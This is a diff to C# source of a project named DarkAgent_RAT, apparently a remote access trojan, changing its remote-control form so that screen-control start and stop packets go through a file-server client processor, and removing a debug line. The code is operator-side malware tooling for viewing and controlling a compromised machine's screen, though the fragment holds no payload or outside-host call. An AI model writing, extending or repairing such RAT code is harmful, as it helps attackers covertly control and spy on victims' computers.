@@ -12,6 +12,8 @@ using System.Runtime.InteropServices;
 using DarkAgent_RAT.src.Events;
 using DarkAgent_RAT.src.Network.DataNetwork;
 using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
+using DarkAgent_RAT.src.Network.FileServer.Packets.Send;
+using DarkAgent_RAT.src.Network.FileServer;
 
 namespace DarkAgent_RAT
 {
@@ -31,7 +33,6 @@ namespace DarkAgent_RAT
 
         public void onRemoteControlScreen(object o, RemoteControlEventArgs e)
         {
-            Console.WriteLine("IM CALLED SO BADLYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY");
             try
             {
                 if(e.RemoteIP != RatClientProcessor.Instance._clientList[ClientID].FileServerRemoteIP)
@@ -134,8 +135,8 @@ namespace DarkAgent_RAT
         {
             this.Text = "DarkAgent - RemoteControl [" + RemoteIP.Split(':')[0] + "] [" + ClientName + "]";
             RemoteControlEvent.RemoteControl += new RemoteControlHandler(onRemoteControlScreen);
-            if (RatClientProcessor.Instance._clientList.ContainsKey(ClientID))
-                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteControlScreen(RatClientProcessor.Instance._clientList[ClientID], 1));
+            if (FileClientProcessor.Instance._clientList.ContainsKey(ClientID))
+                FileClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteControlScreen(FileClientProcessor.Instance._clientList[ClientID], 1));
 
             this.KeyPreview = true;
             this.KeyDown+= new KeyEventHandler(RemoteControl_KeyDown);
@@ -152,8 +153,8 @@ namespace DarkAgent_RAT
         private void RemoteControl_FormClosing(object sender, FormClosingEventArgs e)
         {
             RemoteControlEvent.RemoteControl -= new RemoteControlHandler(onRemoteControlScreen);
-            if (RatClientProcessor.Instance._clientList.ContainsKey(ClientID))
-                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteControlScreen(RatClientProcessor.Instance._clientList[ClientID], 0));
+            if (FileClientProcessor.Instance._clientList.ContainsKey(ClientID))
+                FileClientProcessor.Instance._clientList[ClientID].SendPacket(new S_RemoteControlScreen(FileClientProcessor.Instance._clientList[ClientID], 0));
         }
 
         private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
